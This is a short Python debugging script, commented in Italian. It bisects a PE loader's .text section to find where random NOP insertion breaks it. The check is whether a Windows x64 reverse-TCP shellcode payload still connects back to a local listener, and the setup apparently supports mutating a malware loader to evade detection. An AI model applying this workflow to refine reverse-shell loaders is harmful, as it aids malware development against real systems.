"""Biseziona la zona di .text in cui l'inserzione rompe il binario."""
import socket
import subprocess
import sys

sys.path.insert(0, ".")
import zone_v2 as Z

EXE = "ploader.exe"
PAYLOAD = "original_pl/x64/windows_x64_custom_reverse_tcp.bin"
SEED = 7


def build(lo, hi, path):
    class Z2(Z.Zone):
        def equal_instructions(self, probability=100):
            return 0

        def _can_insert_after(self, item):
            if not (lo <= item.old_rva < hi):
                return False
            return super()._can_insert_after(item)

    z = Z2(EXE, seed=SEED, verbose=False)
    z.insert_random_nop(probability=10)
    z.write_pe_file(path)
    return z.added_bytes


def test(path):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("127.0.0.1", 1234))
    sock.listen(1)
    sock.settimeout(6)
    proc = subprocess.Popen([path, PAYLOAD],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
    try:
        conn, _ = sock.accept()
        conn.close()
        return True
    except socket.timeout:
        return False
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
        sock.close()


lo, hi = 0x1000, 0x18a90
if not test(path=EXE) if False else True:
    pass
print("baseline (originale):", test(EXE))
print("tutta la .text:", test(build(0x1000, 0x18a90, "tmp/bs_all.exe") and "tmp/bs_all.exe"))

# ricerca binaria: vogliamo la piu' piccola finestra [lo,hi) che rompe
while hi - lo > 0x400:
    mid = (lo + hi) // 2
    left = "tmp/bs_left.exe"
    build(lo, mid, left)
    ok = test(left)
    print("  [%#x,%#x) -> %s" % (lo, mid, "OK" if ok else "CRASH"))
    if ok:
        lo = mid
    else:
        hi = mid
print("finestra sospetta: %#x - %#x" % (lo, hi))
